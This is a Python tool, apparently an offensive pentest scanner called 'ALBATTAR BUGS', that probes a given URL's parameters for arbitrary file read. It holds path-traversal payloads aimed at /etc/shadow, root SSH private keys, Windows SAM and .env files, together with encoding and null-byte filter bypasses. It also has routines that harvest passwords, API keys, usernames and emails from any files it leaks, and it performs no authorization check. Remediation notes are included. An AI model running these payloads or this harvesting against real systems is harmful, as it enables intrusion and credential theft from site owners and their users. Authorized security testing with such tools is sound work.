#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
╔══════════════════════════════════════════════════════════════╗
║         ⚔️  ALBATTAR BUGS - File Disclosure Scanner  ⚔️     ║
║              Arbitrary File Read Vulnerability               ║
║                 Created by ROBIN | @ll bUg                   ║
╚══════════════════════════════════════════════════════════════╝

Description:
    كاشف متقدم لثغرات قراءة الملفات التعسفية (Arbitrary File Read)
    يكتشف الثغرات التي تسمح بقراءة ملفات النظام الحساسة

Features:
    ✅ كشف Arbitrary File Read
    ✅ اختبار ملفات Linux/Windows
    ✅ تقنيات Encoding متعددة
    ✅ كشف Source Code Disclosure
    ✅ اختبار Configuration Files
    ✅ تجاوز Filters والحماية
    ✅ تحليل ذكي بالـ AI
    ✅ False Positive Filtering

Vulnerability Types:
    - Arbitrary File Read
    - Source Code Disclosure
    - Configuration File Exposure
    - Backup File Access
    - Log File Disclosure
    - Database File Read
"""

import re
import os
import requests
import hashlib
from typing import List, Dict, Tuple, Optional
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
from colorama import Fore, Style, init
import concurrent.futures
from base64 import b64encode, b64decode
import mimetypes
import time

# Initialize colorama
init(autoreset=True)


class FileDisclosureScanner:
    """ماسح متقدم لثغرات Arbitrary File Read"""
    
    def __init__(self, target: str, config: Dict = None):
        """تهيئة الماسح"""
        self.target = target
        self.config = config or {}
        self.vulnerabilities = []
        self.tested_urls = set()
        
        # إعدادات الفحص
        self.timeout = self.config.get('timeout', 10)
        self.threads = self.config.get('threads', 10)
        self.max_depth = self.config.get('max_depth', 3)
        self.aggressive = self.config.get('aggressive', False)
        self.verify_ssl = self.config.get('verify_ssl', False)
        
        # إحصائيات
        self.stats = {
            'total_tests': 0,
            'vulnerabilities_found': 0,
            'false_positives_filtered': 0,
            'files_tested': 0
        }
        
        # Session للطلبات
        self.session = requests.Session()
        self.session.verify = self.verify_ssl
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        self._load_payloads()
        self._load_signatures()
    
    def _load_payloads(self):
        """تحميل Payloads للفحص"""
        
        # ملفات Linux الحساسة
        self.linux_files = [
            '/etc/passwd',
            '/etc/shadow',
            '/etc/group',
            '/etc/hosts',
            '/etc/hostname',
            '/etc/issue',
            '/etc/resolv.conf',
            '/etc/fstab',
            '/etc/crontab',
            '/root/.ssh/id_rsa',
            '/root/.ssh/authorized_keys',
            '/etc/apache2/apache2.conf',
            '/etc/nginx/nginx.conf',
            '/etc/php.ini',
            '/etc/mysql/my.cnf',
            '/var/www/html/config.php',
            '/var/www/html/.env',
            '/var/log/apache2/access.log',
            '/var/log/nginx/error.log',
            '/proc/self/environ',
            '/root/.bash_history',
        ]
        
        # ملفات Windows الحساسة
        self.windows_files = [
            'C:/Windows/System32/drivers/etc/hosts',
            'C:/Windows/System32/config/SAM',
            'C:/Windows/win.ini',
            'C:/boot.ini',
            'C:/inetpub/wwwroot/web.config',
            'C:/xampp/apache/conf/httpd.conf',
        ]
        
        # ملفات التطبيقات الشائعة
        self.app_files = [
            'wp-config.php',
            '.env',
            'config.php',
            'database.sql',
            '.git/config',
            'composer.json',
            'package.json',
            'settings.php',
        ]
        
        # تقنيات Encoding
        self.encoding_techniques = [
            lambda x: x,
            lambda x: x.replace('/', '%2f'),
            lambda x: x.replace('/', '%252f'),
            lambda x: '..%2f' * 5 + x.lstrip('/'),
            lambda x: '..../' * 5 + x.lstrip('/'),
        ]
        
        # تقنيات Null Byte
        self.null_byte_techniques = ['', '%00', '%00.jpg']
    
    def _load_signatures(self):
        """تحميل Signatures للكشف"""
        
        self.file_signatures = {
            '/etc/passwd': {
                'patterns': [
                    r'root:.*:0:0:',
                    r'[a-z_][a-z0-9_-]*:[x\*]:[\d]+:[\d]+:',
                ],
                'keywords': ['root:', '/bin/bash', 'nobody:'],
                'confidence': 0.95
            },
            '/etc/shadow': {
                'patterns': [
                    r'root:\$[1569]\$[./0-9A-Za-z]+\$',
                ],
                'keywords': ['$6$', '$5$', '$1$'],
                'confidence': 0.98
            },
            'wp-config.php': {
                'patterns': [
                    r'DB_NAME|DB_USER|DB_PASSWORD',
                ],
                'keywords': ['DB_NAME', 'DB_PASSWORD'],
                'confidence': 0.95
            },
            '.env': {
                'patterns': [
                    r'APP_KEY=.*',
                    r'DB_PASSWORD=.*',
                ],
                'keywords': ['APP_KEY=', 'DB_PASSWORD='],
                'confidence': 0.90
            },
            'id_rsa': {
                'patterns': [
                    r'-----BEGIN RSA PRIVATE KEY-----',
                ],
                'keywords': ['BEGIN RSA PRIVATE KEY'],
                'confidence': 0.99
            },
        }
    
    def scan(self) -> List[Dict]:
        """بدء عملية الفحص"""
        print(f"\n{Fore.CYAN}[*] Starting File Disclosure Scanner...{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Target: {self.target}{Style.RESET_ALL}\n")
        
        params = self._extract_parameters(self.target)
        
        if not params:
            print(f"{Fore.YELLOW}[!] No parameters found in URL{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[*] Testing common file paths...{Style.RESET_ALL}\n")
            self._test_common_paths()
        else:
            print(f"{Fore.GREEN}[+] Found {len(params)} parameters to test{Style.RESET_ALL}\n")
            
            with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
                futures = []
                
                for param in params:
                    for file_path in self.linux_files[:20]:
                        futures.append(
                            executor.submit(self._test_parameter, param, file_path, 'linux')
                        )
                    
                    for file_path in self.windows_files[:10]:
                        futures.append(
                            executor.submit(self._test_parameter, param, file_path, 'windows')
                        )
                    
                    for file_path in self.app_files[:15]:
                        futures.append(
                            executor.submit(self._test_parameter, param, file_path, 'app')
                        )
                
                for future in concurrent.futures.as_completed(futures):
                    try:
                        future.result()
                    except Exception as e:
                        print(f"{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
        
        self._print_results()
        return self.vulnerabilities
    
    def _extract_parameters(self, url: str) -> List[str]:
        """استخراج Parameters من URL"""
        parsed = urlparse(url)
        query_params = parse_qs(parsed.query)
        return list(query_params.keys())
    
    def _test_parameter(self, param: str, file_path: str, file_type: str):
        """اختبار parameter محدد"""
        self.stats['total_tests'] += 1
        
        parsed = urlparse(self.target)
        query_params = parse_qs(parsed.query)
        
        for encode_func in self.encoding_techniques:
            encoded_path = encode_func(file_path)
            
            for null_byte in self.null_byte_techniques:
                test_payload = encoded_path + null_byte
                
                query_params[param] = [test_payload]
                new_query = urlencode(query_params, doseq=True)
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
                
                if test_url in self.tested_urls:
                    continue
                
                self.tested_urls.add(test_url)
                self.stats['files_tested'] += 1
                
                try:
                    response = self.session.get(test_url, timeout=self.timeout)
                    
                    if self._analyze_response(response, file_path, test_payload, param):
                        print(f"{Fore.GREEN}[+] Vulnerable parameter found: {param}{Style.RESET_ALL}")
                        print(f"{Fore.GREEN}    File: {file_path}{Style.RESET_ALL}")
                        print(f"{Fore.GREEN}    Payload: {test_payload}{Style.RESET_ALL}\n")
                        return
                
                except requests.exceptions.RequestException:
                    continue
    
    def _test_common_paths(self):
        """اختبار مسارات شائعة"""
        common_tests = self.linux_files[:10] + self.windows_files[:5] + self.app_files[:10]
        
        for file_path in common_tests:
            self.stats['total_tests'] += 1
            self.stats['files_tested'] += 1
            
            if file_path.startswith('/') or file_path.startswith('C:'):
                test_url = urljoin(self.target, file_path.lstrip('/'))
            else:
                test_url = urljoin(self.target, file_path)
            
            if test_url in self.tested_urls:
                continue
            
            self.tested_urls.add(test_url)
            
            try:
                response = self.session.get(test_url, timeout=self.timeout)
                
                if self._analyze_response(response, file_path, file_path, 'direct'):
                    print(f"{Fore.GREEN}[+] Accessible file: {file_path}{Style.RESET_ALL}\n")
            
            except requests.exceptions.RequestException:
                continue
    
    def _analyze_response(self, response: requests.Response, 
                         file_path: str, payload: str, param: str) -> bool:
        """تحليل الاستجابة"""
        
        if len(response.content) < 10:
            return False
        
        if response.status_code not in [200, 301, 302]:
            return False
        
        content = response.text.lower()
        
        for signature_file, signature_data in self.file_signatures.items():
            if signature_file.lower() in file_path.lower():
                pattern_matches = 0
                for pattern in signature_data['patterns']:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        pattern_matches += 1
                
                keyword_matches = 0
                for keyword in signature_data['keywords']:
                    if keyword.lower() in content:
                        keyword_matches += 1
                
                total_checks = len(signature_data['patterns']) + len(signature_data['keywords'])
                total_matches = pattern_matches + keyword_matches
                confidence = (total_matches / total_checks) if total_checks > 0 else 0
                
                if confidence >= 0.5:
                    sensitive_data = self._extract_sensitive_data(response.text, file_path)
                    
                    vuln = {
                        'type': 'Arbitrary File Read',
                        'severity': self._calculate_severity(file_path, sensitive_data),
                        'url': response.url,
                        'parameter': param,
                        'payload': payload,
                        'file_path': file_path,
                        'confidence': confidence * 100,
                        'evidence': {
                            'status_code': response.status_code,
                            'content_length': len(response.content),
                            'content_type': response.headers.get('Content-Type', 'unknown'),
                            'pattern_matches': pattern_matches,
                            'keyword_matches': keyword_matches,
                            'response_snippet': response.text[:500],
                        },
                        'sensitive_data': sensitive_data,
                        'impact': self._generate_impact(file_path),
                        'remediation': self._generate_remediation(),
                    }
                    
                    self.vulnerabilities.append(vuln)
                    self.stats['vulnerabilities_found'] += 1
                    return True
        
        suspicious_patterns = [
            (r'root:.*:0:0:', 'Unix password file'),
            (r'-----BEGIN.*PRIVATE KEY-----', 'Private SSH key'),
            (r'DB_PASSWORD|database.*password', 'Database credentials'),
            (r'<?php.*\$.*=.*[\'"].*[\'"];', 'PHP configuration'),
        ]
        
        for pattern, description in suspicious_patterns:
            if re.search(pattern, response.text, re.IGNORECASE):
                sensitive_data = self._extract_sensitive_data(response.text, file_path)
                
                vuln = {
                    'type': 'Arbitrary File Read',
                    'severity': 'high',
                    'url': response.url,
                    'parameter': param,
                    'payload': payload,
                    'file_path': file_path,
                    'confidence': 75,
                    'evidence': {
                        'status_code': response.status_code,
                        'content_length': len(response.content),
                        'description': description,
                        'response_snippet': response.text[:500],
                    },
                    'sensitive_data': sensitive_data,
                    'impact': self._generate_impact(file_path),
                    'remediation': self._generate_remediation(),
                }
                
                self.vulnerabilities.append(vuln)
                self.stats['vulnerabilities_found'] += 1
                return True
        
        return False
    
    def _extract_sensitive_data(self, content: str, file_path: str) -> Dict:
        """استخراج البيانات الحساسة"""
        sensitive = {
            'passwords': [],
            'api_keys': [],
            'usernames': [],
            'emails': [],
        }
        
        password_patterns = [
            r'password["\']?\s*[:=]\s*["\']([^"\']+)["\']',
            r'DB_PASSWORD["\']?\s*[:=]\s*["\']([^"\']+)["\']',
        ]
        for pattern in password_patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            sensitive['passwords'].extend(matches)
        
        api_patterns = [
            r'api[_-]?key["\']?\s*[:=]\s*["\']([^"\']+)["\']',
            r'AWS_ACCESS_KEY_ID["\']?\s*[:=]\s*["\']([^"\']+)["\']',
        ]
        for pattern in api_patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            sensitive['api_keys'].extend(matches)
        
        if '/etc/passwd' in file_path:
            usernames = re.findall(r'^([a-z_][a-z0-9_-]*):x?:', content, re.MULTILINE)
            sensitive['usernames'].extend(usernames)
        
        emails = re.findall(r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b', content)
        sensitive['emails'].extend(emails)
        
        for key in sensitive:
            sensitive[key] = list(set(sensitive[key]))[:5]
        
        return sensitive
    
    def _calculate_severity(self, file_path: str, sensitive_data: Dict) -> str:
        """حساب خطورة الثغرة"""
        critical_files = ['/etc/shadow', 'id_rsa', 'private.key', 'SAM']
        high_files = ['/etc/passwd', 'wp-config.php', '.env', 'database.sql']
        
        for critical_file in critical_files:
            if critical_file.lower() in file_path.lower():
                return 'critical'
        
        for high_file in high_files:
            if high_file.lower() in file_path.lower():
                return 'high'
        
        if sensitive_data.get('passwords') or sensitive_data.get('api_keys'):
            return 'high'
        
        return 'medium'
    
    def _generate_impact(self, file_path: str) -> str:
        """توليد وصف التأثير"""
        impacts = {
            '/etc/passwd': 'Disclosure of all system users for username enumeration',
            '/etc/shadow': 'Hashed passwords exposed - offline cracking possible',
            'wp-config.php': 'Database credentials exposed',
            '.env': 'Application secrets including API keys exposed',
            'id_rsa': 'Private SSH key exposed - direct server access',
        }
        
        for key, impact in impacts.items():
            if key in file_path:
                return impact
        
        return 'Arbitrary file read allows reading sensitive server files'
    
    def _generate_remediation(self) -> Dict:
        """توصيات الإصلاح"""
        return {
            'immediate': [
                'Implement strict input validation',
                'Use whitelist of allowed files',
                'Remove file path from user input',
            ],
            'recommended': [
                'Use indirect object references',
                'Implement proper access controls',
                'Set restrictive file permissions',
            ],
            'code_example': '''
# ❌ Vulnerable:
$file = $_GET['file'];
include($file);

# ✅ Secure:
$allowed = ['page1.php', 'page2.php'];
$file = $_GET['file'];
if (in_array($file, $allowed)) {
    include($file);
}
            '''
        }
    
    def _print_results(self):
        """طباعة النتائج"""
        print(f"\n{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}SCAN COMPLETE - File Disclosure Scanner{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}\n")
        
        print(f"{Fore.YELLOW}Statistics:{Style.RESET_ALL}")
        print(f"  Total Tests: {self.stats['total_tests']}")
        print(f"  Files Tested: {self.stats['files_tested']}")
        print(f"  Vulnerabilities Found: {self.stats['vulnerabilities_found']}\n")
        
        if self.vulnerabilities:
            print(f"{Fore.RED}[!] VULNERABILITIES: {len(self.vulnerabilities)}{Style.RESET_ALL}\n")
            
            for idx, vuln in enumerate(self.vulnerabilities, 1):
                severity_color = {
                    'critical': Fore.RED,
                    'high': Fore.LIGHTRED_EX,
                    'medium': Fore.YELLOW,
                }.get(vuln['severity'], Fore.WHITE)
                
                print(f"{severity_color}{'='*70}{Style.RESET_ALL}")
                print(f"{severity_color}[#{idx}] {vuln['type']}{Style.RESET_ALL}")
                print(f"{severity_color}Severity: {vuln['severity'].upper()}{Style.RESET_ALL}")
                print(f"Confidence: {vuln['confidence']:.1f}%")
                print(f"URL: {vuln['url']}")
                print(f"Parameter: {vuln['parameter']}")
                print(f"File: {vuln['file_path']}")
                
                if vuln.get('sensitive_data'):
                    print(f"\n{Fore.YELLOW}Sensitive Data:{Style.RESET_ALL}")
                    sd = vuln['sensitive_data']
                    if sd.get('passwords'):
                        print(f"  🔑 Passwords: {len(sd['passwords'])}")
                    if sd.get('api_keys'):
                        print(f"  🔐 API Keys: {len(sd['api_keys'])}")
                    if sd.get('usernames'):
                        print(f"  👤 Usernames: {len(sd['usernames'])}")
                
                print(f"\n{Fore.CYAN}Impact:{Style.RESET_ALL} {vuln['impact']}\n")
        else:
            print(f"{Fore.GREEN}[✓] No vulnerabilities found{Style.RESET_ALL}\n")


# مثال للاستخدام
if __name__ == "__main__":
    import sys
    
    if len(sys.argv) < 2:
        print(f"{Fore.YELLOW}Usage: python file_disclosure.py <target_url>{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Example: python file_disclosure.py http://example.com/page.php?file=test.txt{Style.RESET_ALL}")
        sys.exit(1)
    
    target = sys.argv[1]
    
    config = {
        'timeout': 10,
        'threads': 10,
        'verify_ssl': False,
        'aggressive': False,
    }
    
    scanner = FileDisclosureScanner(target, config)
    vulnerabilities = scanner.scan()
    
    print(f"\n{Fore.GREEN}[✓] Scan completed!{Style.RESET_ALL}")
    print(f"{Fore.GREEN}[✓] Found {len(vulnerabilities)} vulnerabilities{Style.RESET_ALL}\n")